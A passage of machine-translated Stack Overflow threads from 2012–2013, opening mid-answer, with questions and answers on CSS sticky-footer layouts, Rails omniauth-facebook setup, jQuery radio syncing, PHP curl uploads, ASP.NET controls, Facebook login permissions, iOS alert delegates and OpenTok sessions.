position:   absolute;
top:    50px;
bottom: 50px;
width:  100%;
background: #0f0;
} 
```

第二个显示您可以使用相同的技术来拥有动态页眉和页脚。 [http://jsfiddle.net/reqXJ/](http://jsfiddle.net/reqXJ/)

```
 <body>
    <div class="header"><p>Header</p></div>
    <div class="cssBody"><p>Hello World</p></div>
    <div class="footer"><p>Footer</p></div>
</body>

html, body, {
    height: 100%;
}

.header {
    position:   absolute;
    top:        0px;
    height:     15%;
    width:      100%;
    background: #f00;
}

.footer {
    position:   absolute;
    bottom:     0;
    height:     15%;
    width:      100%;
    background: #00f;
}

.cssBody {
    position:   absolute;
    top:        15%;
    bottom:     15%;
    width:      100%;
    background: #0f0;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T07:51:53.833

这是一个非常常见的问题，对我有用的解决方案之一来自以下网站：

[http://ryanfait.com/sticky-footer/](http://ryanfait.com/sticky-footer/)

使用代码：

[http://ryanfait.com/sticky-footer/layout.css](http://ryanfait.com/sticky-footer/layout.css)

和另一个流行的选择：

[http://www.cssstickyfooter.com/](http://www.cssstickyfooter.com/)

如果这不能满足您的需求，请告诉我们，我们可以提供更多帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T08:16:57.680

好像你正在尝试做一个粘性页脚，嗯......你需要一些技巧：

## HTML：

```
<div id='container'>
   <div class="header">
      <h1>Sticky Footer!</h1>
   </div>
   <div id='rowOne'>row 1</div>
   <div id='rowTwo'>row 2</div>
   <div id='rowThree'>row 3</div>
   <div class="push"></div>
</div>
<div id='footer'></div> 
```

## CSS

```
.container {
   min-height: 100%;
   height: auto !important;height: 100%; 
   /* the bottom margin is the negative value of the footer's height */
   margin: 0 auto -142px;
}
.footer, .push{
   height: 142px; /* .push must be the same height as .footer */
} 
```

**注意：**将页脚和推送高度替换为您的固定高度，并且不要忘记在容器中的行之后插入推送 div。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T07:52:48.170

您可以通过绝对定位行并在中间行的顶部和底部添加填充来伪造这一点。你不能像处理桌子那样做

```
#container { position:relative; height:800px } // needs height

#rowOne, #rowTwo, #rowThree { position:absolute }

#rowOne { top:0; left:0 }
#rowThree { bottom:0; left:0 }

#rowTwo { left:0; top:0; padding:50px 0; } // top and bottom padding 50px 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T08:02:06.050

这行代码有帮助吗？ [演示](http://jsfiddle.net/yaSWM/72/)

试试这个：

```
#container{
   ...
   position:relative;
}
#content{
   min-height: xxx;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-23T08:12:43.943

这应该完全符合您的要求：

### html代码：

```
<div id="header">
    header
</div>
<div id='container'>
    <div id='rowOne'>one</div>
    <div id='rowTwo'>two</div>
    <div id='rowThree'>three</div>
</div>
<div class="clearfix"></div>
<div id="footer">
    footer
</div> 
```

### CSS 代码：

```
.clearfix {
    clear: both;
}
#header, #footer {
    background-color: red;
}
#container {
    width: 100%;
}
#rowOne {
    width: 25%;
    background: green;
    float: left;
} 
#rowTwo {
    width: 55%;
    height: 100px;
    background: limegreen;
    float: left;
}
#rowThree {
    width: 20%;
    background: green;
    float: left;
}​ 
```

您也可以在[jsFiddle上进行测试](http://jsfiddle.net/Vz9RL/1/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-23T09:06:59.013

您是否尝试过查看 CSS 框架？它们带有默认类，您可以使用它们在短短几分钟内设置类似的东西。它们还有助于生成更简洁的 html 和界面，您可以在以后轻松地重新设计它们。

[http://twitter.github.com/bootstrap/index.html](http://twitter.github.com/bootstrap/index.html)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-11-23T09:45:06.557

我希望你看起来像这样：-[**演示**](http://tinkerbin.com/it6pOZMa)

**CSS**

```
#container {
    height: 100%;
}

#rowOne {
    height: 50px;
    background: green;
    position:fixed;
    left:0;
    right:0;
}
#rowTwo {
    background: limegreen;
    min-height:500px;
    position:absolute;
    left:0;
    right:0;
    top:50px;
}
#rowThree {
    position: fixed;
    background: green;
    bottom:0;
    left:0;
    right:0;
    height:50px;
} 
```

**HTML**

```
<div id='container'>
    <div id='rowOne'>row 1</div>
    <div id='rowTwo'>row 2</div>
    <div id='rowThree'>row 3</div>
</div> 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-11-23T09:59:45.987

一种方法是使用 Jquery 将中间 div 的最小高度设置为屏幕的高度，减去其他两个 div 的高度（100px），这样应该可以：

```
$(document).ready(function() {

    var screenHeight = $(document).height() - 100px;

    $('#rowTwo').css('min-height' , screenHeight);

}); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-11-29T02:47:07.227

针对您对 jedrus07 回答的评论：

> 所有这些解决方案都会扩展页脚 div 后面的中心 div。我想要一个解决方案，每个 div 只有他自己的空间。

唯一的方法是使用 CSS 3 calc()。如果您不需要支持很多浏览器，这是一个选项，下面是它的演示：

[http://jsfiddle.net/5QGgZ/3/](http://jsfiddle.net/5QGgZ/3/)

（使用 Chrome 或 Safari。）

HTML：

```
<html>
  <body>
    <div id='container'>
      <div id='rowOne'>row 1</div>
      <div id='rowTwo'>row 2</div>
      <div id='rowThree'>row 3</div>
    </div>
  </body>
</html> 
```

CSS：

```
html, body, #container {
  height: 100%;
}
#rowOne {
  height: 50px;
  background: #f00;
}
#rowTwo {
  height: -webkit-calc(100% - 100px);
  background: #0f0;
}
#rowThree {
  height: 50px;
  background: #00f;
} 
```

如果您想要更广泛的浏览器支持，您将不得不使用像 jedrus07 提到的那样的粘性页脚解决方案，或者 Tom Sarduy 的回答。

# ruby-on-rails - 当每个请求的应用程序 ID 和应用程序密码不同时使用omniauth-facebook？

> ID：13524919
> 
> 赞同：11
> 
> 时间：2012-11-23T07:46:54.063
> 
> 标签：ruby-on-rails, omniauth

omn [​​iauth-facebook](https://github.com/mkdynamic/omniauth-facebook) README 提到了如何在初始化程序中设置它，以及如何设置选项，例如`scope`每个请求。我想知道是否也可以为每个请求设置应用程序 ID 和应用程序密码。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-23T11:34:52.807

你可以这样做：

在您的 omniauth.rb 上，执行以下操作：

```
Rails.application.config.middleware.use OmniAuth::Builder do
  provider :facebook,:setup => true
end 
```

然后在您的控制器上，您必须定义以下内容：

```
def setup
 request.env['omniauth.strategy'].options[:client_id] = @site.facebook_key
 request.env['omniauth.strategy'].options[:client_secret] = @site.facebook_secret
 render :text => "Setup complete.", :status => 404
end 
```

当然，你必须在你的 routes.rb 中添加相关的路由。

```
 #Facebook Omniauth routes
  match '/auth/facebook/callback' => 'session#authorize_callback'
  match '/auth/facebook/setup' => 'session#setup' 
```

祝你好运

问候。伊万。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-05-30T08:00:06.733

我使用设计（遵循此 railscast：[http:](http://railscasts.com/episodes/235-devise-and-omniauth-revised) //railscasts.com/episodes/235-devise-and-omniauth-revised ），但我花了一段时间才了解如何实施 Ivangrx 的解决方案。事实证明这很容易。这是我的代码：

```
# /config/initializers/devise.rb
config.omniauth :facebook, setup: true

# routes.rb
devise_scope :user do  
  #where omniauth_callback is the controller I made when following the Railscast
  get "users/auth/facebook/setup" => "omniauth_callbacks#setup"
end

# omniauth_callbacks_controller.rb
def setup
  request.env['omniauth.strategy'].options[:client_id] = @site.facebook_id
  request.env['omniauth.strategy'].options[:client_secret] = @site.facebook_key
  render :text => "Setup complete.", :status => 404
end 
```

感谢您对此的帮助！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T09:07:02.587

如果您使用的是设计，您可以这样做

```
config.omniauth  :facebook, :setup => lambda{
      current_app_secret = // Get current domain
      current_app_key = // Get config
      env['omniauth.strategy'].options[:client_id] = current_app_secret
      env['omniauth.strategy'].options[:client_secret] = current_app_key
    } 
```

# javascript - 在 2 个单选按钮组之间同步选定的单选按钮 - 相反

> ID：13524921
> 
> 赞同：2
> 
> 时间：2012-11-23T07:46:57.640
> 
> 标签：javascript, jquery, radio-button

[我需要在 2 个单选按钮组之间](https://stackoverflow.com/questions/8804377/jquery-sync-selected-radio-button-between-2-radio-button-groups)执行类似于JQuery Sync Selected Radio Button 的操作。

我有 2 个广播组 -

```
<input type="radio" name="radio_A" id="radio_A_1" value="1" />1st
<input type="radio" name="radio_A" id="radio_A_2" value="2" />2nd 

<input type="radio" name="radio_B" id="radio_B_1" value="1" />1st
<input type="radio" name="radio_B" id="radio_B_2" value="2" />2nd 
```

检查时`radio_A_1`，我需要`radio_B_2`同步/检查。关系将是-
`radio_A_1`=> `radio_B_2`
`radio_A_2`=> `radio_B_1`
`radio_B_1`=> `radio_A_2`
`radio_B_2`=>`radio_A_1`

使用提供的答案[#8804502](https://stackoverflow.com/questions/8804377/jquery-sync-selected-radio-button-between-2-radio-button-groups#8804502)

```
$('input[name=radio_A]').change(function() {
var index = $(this).index('input[name=radio_A]');
console.log(index);
$('input[name=radio_B]:eq(' + index + ')').attr('checked','checked');
}); 
```

我得到相同=>相同，但仅在更改时`A`-
`radio_A_1`=> `radio_B_1`
`radio_A_2`=>`radio_B_2`

因此，如果我复制它，则将其更改`A=>B`为`B=>A`-

```
$('input[name=radio_A]').change(function() {
var index = $(this).index('input[name=radio_A]');
console.log(index);
$('input[name=radio_B]:eq(' + index + ')').attr('checked','checked');
});
$('input[name=radio_B]').change(function() {
var index = $(this).index('input[name=radio_B]');
console.log(index);
$('input[name=radio_A]:eq(' + index + ')').attr('checked','checked');
}); 
```

`A`当或`B`改变时，我得到相同=>相同-
`radio_A_1`=> `radio_B_1`
`radio_A_2`=> `radio_B_2` `radio_B_1`=> `radio_A_1`
`radio_B_2`=>`radio_A_2`

如何同步它们`1=>2`/ `2=>1`，而不是`1=>1`/ `2=>2`？它可以用 1 块代码而不是 2 块来完成吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T08:20:20.273

您需要添加一些代码来获取`index`刚刚单击的元素并将其设置为`0`if it is`1`或`1`if it is `0`。想到的第一个方法如下：

```
$('input[name=radio_A]').change(function() {
    var index = $(this).index('input[name=radio_A]') === 1 ? 0 : 1;
    $('input[name=radio_B]:eq(' + index + ')').attr('checked', 'checked');
});
$('input[name=radio_B]').change(function() {
    var index = $(this).index('input[name=radio_B]') === 1 ? 0 : 1;
    $('input[name=radio_A]:eq(' + index + ')').attr('checked', 'checked');
}); 
```

演示：http: [//jsfiddle.net/cTQeJ/1/](http://jsfiddle.net/cTQeJ/1/)

虽然您也可以尝试：

```
var index = 1 - $(this).index('input[name=radio_A]'); 
```

（或者如果你想让你的代码混乱，下面的演示使用了一种有趣的技巧：http: [//jsfiddle.net/cTQeJ/](http://jsfiddle.net/cTQeJ/)）

> *“它可以用 1 块代码而不是 2 块来完成吗？”*

如果您可以稍微修改 html，那么使用一个简短的代码块就很容易了。尝试这样的改变：

```
<input type="radio" name="radio_A" data-sync="1" value="1" />1st
<input type="radio" name="radio_A" data-sync="2" value="2" />2nd

<input type="radio" name="radio_B" data-sync="2" value="1" />1st
<input type="radio" name="radio_B" data-sync="1" value="2" />2nd 
```

我`data-sync`为每个单选按钮添加了一个属性（并删除了该`id`属性，因为它没有被使用，但显然如果需要你可以保留它）。然后你可以写一个像这样的简单函数：

```
var $radios = $('input[data-sync]');
$radios.change(function() {
    $radios.filter('[data-sync="' + $(this).attr('data-sync') + '"]')
           .prop('checked', true);
});​ 
```

...基本上说，每当检查任何无线电按钮时，都会找到具有`data-sync`相同值属性的所有其他无线电按钮，并检查它们。

请注意，这将适用于两个以上的组，如本演示所示：http: [//jsfiddle.net/cTQeJ/2/](http://jsfiddle.net/cTQeJ/2/)

# java - JSTL 的 HTTP 客户端

> ID：13524923
> 
> 赞同：0
> 
> 时间：2012-11-23T07:47:03.753
> 
> 标签：java, tomcat, proxy, jstl, httpclient

目前我正在使用 JSTL 标签从第三方 API 获取 URL。为此，我在类路径中添加了标准 1.0.6.jar。我用的是tomcat服务器。

我想知道这在技术上是如何工作的。c:import 使用哪个 HTTP 客户端？是否在standard.jar中为JSTL构建了单独的http客户端，还是会使用tomcat服务器使用的http客户端？

如果我需要使用 Internet 代理服务器访问 Internet 以获取相同的第三方 API，我需要修改 HTTP 客户端的哪一部分（在任何 jstl http 客户端的 standard.jar 中或在 tomcat httpclient 中）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T15:31:38.630

它只是使用标准的 Java SE[`URLConnection`](http://docs.oracle.com/javase/6/docs/api/java/net/URLConnection.html)类。您可以按如下方式在纯 Java 中使用它：

```
URLConnection connection = new URL("http://stackoverflow.com").openConnection();
InputStream input = connection.getInputStream();
// ... 
```

或者通过[`URL#openStream()`](http://docs.oracle.com/javase/6/docs/api/java/net/URL.html#openStream%28%29)快捷方式：

```
InputStream input = new URL("http://stackoverflow.com").openStream();
// ... 
```

`InputStream`包含 HTTP 响应。`OutputStream`只需以通常的方式将其读/写为任意方式即可。

### 也可以看看：

*   [使用 java.net.URLConnection 触发和处理 HTTP 请求](https://stackoverflow.com/questions/2793150/how-to-use-java-net-urlconnection-to-fire-and-handle-http-requests)

# php - .htaccess 它将我的文件夹隐藏在本地主机中

> ID：13524924
> 
> 赞同：0
> 
> 时间：2012-11-23T07:47:08.667
> 
> 标签：php, apache, .htaccess, redirect

我正在制作一个 .htaccess 文件来运行我正在测试的框架，但是当我尝试访问我的本地主机时，框架文件所在的文件夹没有显示出来。如果我尝试访问，请求`localhost/my_hidden_folder/`this 会触发 500 错误，内部服务器错误。

这种行为是我的 apache|.htaccess 配置错误的结果，我很确定，因为另一台服务器中的相同 .htaccess 可以正常工作。

这是我的.htaccess：

```
RewriteEngine On

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-l

RewriteRule ^(.+)$ index.php?url=$1 [QSA,L] 
```

这是我的默认文件`/etc/apache2/sites-available`：

```
<VirtualHost *:80>
    ServerAdmin webmaster@localhost

    DocumentRoot /var/www
    <Directory />
            Options FollowSymLinks
            AllowOverride None
    </Directory>
    <Directory /var/www/>
            Options Indexes FollowSymLinks MultiViews
            AllowOverride All
            Order allow,deny
            allow from all
    </Directory>
    <Directory /var/www/entrega2>
            AllowOverride All
    </Directory>
    <Directory /var/www/unlp>
            AllowOverride All
    </Directory>

    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    <Directory "/usr/lib/cgi-bin">
            AllowOverride None
            Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
            Order allow,deny
            Allow from all
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log

    # Possible values include: debug, info, notice, warn, error, crit,
    # alert, emerg.
    LogLevel warn
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost> 
```

这两个文件夹都具有相同的 .htaccess 文件，`/var/www/unlp`并且`/var/www/entrega2`都是隐藏的。

.htacces 文件中最基本的重定向在我的本地主机中不起作用，但在服务器中起作用。也许我禁用了一个模块？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:55:27.293

.htaccess 中有 +FollowSymlinks 吗？这通常会在已激活该选项的 Linux 系统或 Windows 上执行 500 错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T08:00:03.043

尝试运行 phpinfo() 以确保 mod-rewrite 已激活。在您的 Web 根文件夹中创建简单的 php 文件，其中包含：

```
<?php
  phpinfo();
?> 
```

# javascript - dojo.store.Observable、JSON REST 和 queryEngine

> ID：13524930
> 
> 赞同：7
> 
> 时间：2012-11-23T07:47:42.173
> 
> 标签：javascript, ajax, dojo, datastore, restful-architecture

有谁知道如何在 dojo 中使用 JsonRest 存储和 Observable weapper，就像 dojo.store.Observable 中的那样？

在服务器端，我需要什么来实现 store 并使其作为 Observable 工作？客户端呢？文档说[http://dojotoolkit.org/reference-guide/1.7/dojo/store/Observable.html](http://dojotoolkit.org/reference-guide/1.7/dojo/store/Observable.html)

> 如果您使用像 JsonRest 存储这样的服务器端存储，则需要提供一个 queryEngine 以便从查询中正确包含或排除更新对象。如果查询引擎不可用，则将使用未定义的索引调用观察侦听器。

但是，我不知道它们是什么意思。我自己从未创建过商店，也不是 100% 熟悉 queryEngine（老实说，我觉得这有点令人困惑）。为什么需要查询引擎？文档中的“未定义索引”是什么意思？以及如何为 JsonRest 存储编写查询引擎？我不应该为可观察的 REST 存储使用某种 Web 套接字，因为其他用户也可能更改数据？

使困惑！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-23T18:18:20.747

我意识到这个问题有点老了，但这里有一些信息供将来参考。由于这是一个多部分的问题，我将把它分成几个部分：

## 1）JsonRest的服务端实现

关于实现[JsonRest Store 的服务器端](http://dojotoolkit.org/reference-guide/1.8/dojo/store/JsonRest.html#method-and-restful-mapping)有一篇相当不错的文章。它准确地显示了 JsonRest 将生成哪些标头以及其余部分将包含哪些内容。它有助于形成 JsonRest api 如何转换为 HTTP 的心理模型。

## 2) 查询引擎

在同一页面的前面，[解释了 query() 如何在客户端工作](http://dojotoolkit.org/reference-guide/1.8/dojo/store/JsonRest.html#id4)。基本上，该`query()`函数需要能够接收对象文字（例如：）`{title:'Learning Dojo',categoryid:5}`并返回*存储*中与这些条件匹配的对象。*“在存储中”*意味着已经加载到客户端的内存中，而不是服务器上。

根据您要执行的操作，可能不需要编写自己的查询引擎——如果您正在构建自己的自定义存储，只需使用[内置的 SimpleQueryEngine 。](http://dojotoolkit.org/reference-guide/1.8/dojo/store/util/SimpleQueryEngine.html#dojo-store-util-simplequeryengine)引擎只需要传递一个对象字面量，它就会为您添加整个 dojo query() api。

## 3) 可观察的

我的理解是 Observables 监视对象集合中的客户端更改（例如：添加或删除结果）甚至在特定对象中（例如：post 5 已更改标题）。它不监视服务器端发生的更改。它只是提供一种机制来通知客户端应用程序的其他方面数据已更改，以便页面的所有方面保持同步。

在“Collection Data Binding”和“Object Data Binding: dojo/Stateful”标题下有一篇关于[使用 Observables的完整文章。](https://dojotoolkit.org/documentation/tutorials/1.8/data_modeling/)

## 4) 并发

为了使客户端数据与服务器端数据保持同步，您需要做两件事：a) 轮询服务器上其他用户的更改，b) 使用事务将数据发送到服务器。

a) 要轮询数据的更改，您需要让对象存储跟踪变量中的活动查询。然后，每隔一段时间使用`setTimeout()`或`setInterval()`在后台再次运行查询。确保应用程序的小部件或其他方面使用 Observables 来监控它们所依赖的查询结果集的变化。这样，其他用户对服务器的更改将自动反映在整个应用程序中。

b) 使用事务来组合必须组合的动作。然后，确保服务器发回 HTTP 200 状态代码（意思是“它成功了！”）。如果事务在 400 秒内返回 HTTP 状态，那么由于某种原因它不起作用，您需要重新查询数据，因为后端发生了一些变化。例如，您要更新的记录已被删除，因此您无法对其进行更新。在“交易”标题下也有[关于交易的文章](https://dojotoolkit.org/documentation/tutorials/1.8/data_modeling/)

# php - 图片上传错误

> ID：13524934
> 
> 赞同：1
> 
> 时间：2012-11-23T07:48:05.133
> 
> 标签：php, curl, multipartform-data

我想发布一些数据，包括图像。为此，我在 php 中使用 curl。我的代码如下 -

```
 $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: multipart/form-data"));
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0Mozilla/4.0 (compatible;)");
    curl_setopt($ch, CURLOPT_URL, 'http://postacity.co.uk:8080/shine/pp/upload/');
    curl_setopt($ch, CURLOPT_POST, true);
    $post = array(
        'creatorid' => '119',
        'userfile' => '@/temp/fgf.jpg',
        'notice' => 'Image1',
        'catid' => '1',
        'title' => 'bookofzeus',
        'boardid' => '332',
    );
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $response = curl_exec($ch);
    if(curl_errno($ch)) {
        echo 'Error: ' . curl_error($ch);
    }
    else {
        echo $response;
    }
    } 
```

每次我得到同样的错误

> **错误：创建表单数据失败**

我做错了什么吗？我已经搜索过这个问题，但仍然没有找到解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-04T06:33:23.813

文件的路径是问题：`'@/temp/fgf.jpg'`

您应该看看这个错误说明：[错误 50060 - 如果 post 数组值以 @ 开头，则无法创建 formpost 数据](https://bugs.php.net/bug.php?id=50060)

这个问题的解决方案例如在[phpfreaks](http://forums.phpfreaks.com/topic/37353-solved-curl-file-upload-failed-creating-formpost-data-error/)。

并使用文件的**绝对**路径。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-04T07:19:20.317

参考这个它的工作

```
<?php
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible;)");
    curl_setopt($ch, CURLOPT_URL, _VIRUS_SCAN_URL);
    curl_setopt($ch, CURLOPT_POST, true);
    // same as <input type="file" name="file_box">
    $post = array(
        "file_box"=>"@/path/to/myfile.jpg",
        "username"=>"foobar",
        "password"=>"secret",
        "submit"=>"submit"
    );
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
    $response = curl_exec($ch);
?> 
```

也参考这个网址

[http://joshhighland.com/blog/2010/11/27/using-curl-and-php-to-upload-files-through-a-form-post/](http://joshhighland.com/blog/2010/11/27/using-curl-and-php-to-upload-files-through-a-form-post/)

[http://blogs.digitss.com/php/curl-php/posting-or-uploading-files-using-curl-with-php/](http://blogs.digitss.com/php/curl-php/posting-or-uploading-files-using-curl-with-php/)

# asp.net - 从 .aspx 页面动态更改 .ascx 页面中的图像 URL

> ID：13524937
> 
> 赞同：1
> 
> 时间：2012-11-23T07:48:42.457
> 
> 标签：asp.net, image, user-controls

我有用户控件页面 (.ascx)，其中包含站点的标题图像。我需要在 webform(.aspx) 中动态更改标题图像。

我的 .aspx 代码：

```
protected void Page_PreInit(object sender, EventArgs e)
{
   Control hdrCtl = null;
   try
   {                               
       hdrCtl = LoadControl("~/UI/Header.ascx");
       if (hdrCtl != null)
       {    
           Image src = (Image)hdrCtl.FindControl("imgHeader");                                     
           src.ImageUrl = "~/Content/assets/images/editorial_1.jpg";
       }
   }
   catch (Exception ex)
   {
       Trace.Write(ex.Message);
   }
} 
```

但图像没有改变......谁能帮我找出问题所在..

提前致谢

维杰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T08:04:55.163

您的问题是您**再次**加载控件并且没有在页面中添加它：

```
hdrCtl = LoadControl("~/UI/Header.ascx"); 
```

为了使代码按原样工作，它缺少`Page.Controls.Add(hdrCtl)`但我认为这不是你制作它的方式。

我了解您的控件已全部存在于您的页面中，因此这不是更改图像的方法。
要更改您已准备好添加到页面上的自定义控件上的图像，您必须为自定义控件内的图像创建一个参数，如下所示：

```
public string cHeaderImage
{
  set { imgHeader.ImageUrl = value; }
} 
```

然后你简单地做

```
protected void Page_PreInit(object sender, EventArgs e)
{
  // this is the id of your custom control
  headerCntrID.cHeaderImage = "~/Content/assets/images/editorial_1.jpg";
} 
```

# facebook-graph-api - 具有部分权限的 Facebook 服务器端身份验证

> ID：13524939
> 
> 赞同：0
> 
> 时间：2012-11-23T07:48:59.477
> 
> 标签：facebook-graph-api

我正在使用此页面上详细介绍的 Facebook 的服务器端身份验证。

[https://developers.facebook.com/docs/howtos/login/server-side-login/#step5](https://developers.facebook.com/docs/howtos/login/server-side-login/#step5)

我要求像 user_birthday 这样的扩展权限，如果用户接受，我会得到代码

```
YOUR_REDIRECT_URI?
state=YOUR_STATE_VALUE
&code=CODE_GENERATED_BY_FACEBOOK 
```

但是如果假设用户拒绝提供生日，当我得到这个网址时我仍然想继续

```
YOUR_REDIRECT_URI?
error_reason=user_denied
&error=access_denied
&error_description=The+user+denied+your+request.
&state=YOUR_STATE_VALUE 
```

有谁知道如何在这种情况下获取代码，还是我必须要求用户再次登录但这次不要求额外的权限？

干杯，史蒂夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T10:04:45.853

> 有谁知道如何在这种情况下获取代码，还是我必须要求用户再次登录但这次不要求额外的权限？

这里有两种情况：

*   您是第一次要求用户连接到您的应用程序。在这一点上，他们不能拒绝`user_birthday`单独授予您权限（因为这是基本权限而不是扩展权限）——他们要么连接到您的应用程序，要么不连接。

*   用户之前已连接到您的应用程序，现在您正在请求`user_birthday`许可。如果用户拒绝，那将导致`error_reason=user_denied`- 然后您将无法获得`code`参数。

在第二种情况下，当使用服务器端流程时，再次询问用户（可能使用减少的权限集）是唯一的方法——除非您之前已经获得了访问令牌。这不会失效——但它显然只包含之前已经给出的权限。

（如果用户之前连接到您的应用程序，您可以只调用没有范围参数的 Auth 对话框 - 在这种情况下，Facebook 将使用代码参数直接重定向回您的应用程序。或者您可以事先在客户端获取令牌，例如通过调用 FB.getLoginStatus。）

# objective-c - 使用参数调用 UIAlertView 委托方法？

> ID：13524945
> 
> 赞同：2
> 
> 时间：2012-11-23T07:49:41.720
> 
> 标签：objective-c, ios, uibutton, uialertview

我在表格视图的单元格上添加了一个按钮，如下所示 -

```
UIButton* checkBoxBtn = [UIButton buttonWithType:UIButtonTypeCustom];
[checkBoxBtn setBackgroundImage:[UIImage imageNamed:@"check_normal.png"] forState:UIControlStateNormal];
    [checkBoxBtn addTarget:self action:@selector(checkBoxAction:) forControlEvents:UIControlEventTouchUpInside];
    checkBoxBtn.tag = indexPath.row;
    [cell.contentView addSubview:checkBoxBtn]; 
```

这是我的 checkBoxAction

```
-(void) checkBoxAction: (UIButton *)sender
{
    NSInteger i =sender.tag + 1;
    float perc = (i*100/18.0);
    NSLog(@"%.2f",perc);
    NSString* percentageStr = [[NSString alloc] initWithFormat:@"%3.2f%%(%d out of 18)",perc, i];
    barTitle.text = percentageStr;
    barFGImage.hidden = NO;
    if (perc == 100.00) {
        [barFGImage setFrame:CGRectMake(barFGImage.frame.origin.x, barFGImage.frame.origin.y, 276.0, barFGImage.frame.size.height)];
    }
    else
    [barFGImage setFrame:CGRectMake(barFGImage.frame.origin.x, barFGImage.frame.origin.y, 280*perc/100, barFGImage.frame.size.height)];
    [sender setBackgroundImage:[UIImage imageNamed:@"check_select.png"] forState:UIControlStateNormal];
    sender.userInteractionEnabled = NO;
} 
```

现在一切正常，但我想在用户按下时显示警报`checkBoxBtn`，如果用户按下 OK，那么`checkBoxAction`应该调用。我知道我们有`UIAlertView`委托方法

```
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex 
```

但问题是如何在其中获取 checkBoxBtn ？

**编辑：** Midhun MP 的回答没问题，但我还想要一件事——在我的单元格中，我有三个标签和一个按钮![像这个屏幕截图](../Images/1d18c09223ad6b530627b09168454c19.png)，单击复选框我想更改标签“6 天后到期”以及其他内容我们按照我的`checkBoxAction`方法完成了请帮助我。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T08:13:39.867

为此，您需要实现`- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex`委托方法。

你可以这样做：

在 .h 中声明一个 UIButton 实例，例如：

```
UIButton *button; 
```

更改按钮添加方法，如：

```
UIButton* checkBoxBtn = [UIButton buttonWithType:UIButtonTypeCustom];
[checkBoxBtn setBackgroundImage:[UIImage imageNamed:@"check_normal.png"] forState:UIControlStateNormal];
[checkBoxBtn addTarget:self action:@selector(showAlert:) forControlEvents:UIControlEventTouchUpInside];
checkBoxBtn.tag = indexPath.row;
[cell.contentView addSubview:checkBoxBtn];

 - (void) showAlert:(id)sender
{
   button = (UIButton *)sender
   UIAlertView *alert = [[UIAlertView alloc]initWithTitle:@"Title" message:@"Message" delegate:self cancelButtonTitle:@"OK" otherButtonTitles: @"Cancel"];
}

- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
{
   if(buttonIndex == 0)
   {
      [self checkBoxAction:button];
   }
} 
```

获取标签：

将标签添加到标签中，`cellForRowAtIndexPath:`如下所示：

```
statusText.tag = 7;
[cell.contentView addSubview:statusText]; 
```

您可以使用以下代码获取标签：

```
UILabel *tempLabel = (UIlabel *)[[button superview] viewWithTag:7];
tempLabel.text = @"Midhun"; 
```

# iphone - 从 iOS 动态生成 OpenTok 会话 ID

> ID：13524951
> 
> 赞同：2
> 
> 时间：2012-11-23T07:49:58.733
> 
> 标签：iphone, ios

我正在为 iPhone 使用 OpenTokSDK（本机使用它）我已经编写了调用代码，但只有一个问题。：- 我必须静态添加 SessionID。但我想动态生成 ID。

我怎样才能做到这一点 ？请帮忙！

提前致谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-02T16:11:45.237

全面披露：我是 TokBox 的开发人员。

获取设备的会话 ID 和令牌凭据的唯一安全方法是开发适合您应用程序特定需求的应用程序服务器。我们在 GitHub ([链接](https://github.com/opentok)) 上有许多服务器端 SDK，它们将与 OpenTok 服务器 API 交互以生成这些数据。

请注意，服务器端 SDK 足以生成您的凭据，但并非所有设备都在同一个会话中，因此用户管理和应用程序工作流程等所有考虑因素都不能轻易写入开源库。

也就是说，我们确实试图通过在我们的博客（[链接](http://www.tokbox.com/blog/parse-has-opentok-ios-sdks-backend-so-you-dont-have-to/)）上编写代码示例来使其中一些示例更加清晰。通过利用可用的第三方信号服务之一，例如[Parse](http://www.parse.com)和[Pusher](http://www.pusher.com)，您可以减轻编写自己的应用程序服务器的大部分开销（无疑是一项艰巨的任务，尤其是第一次）。

* * *

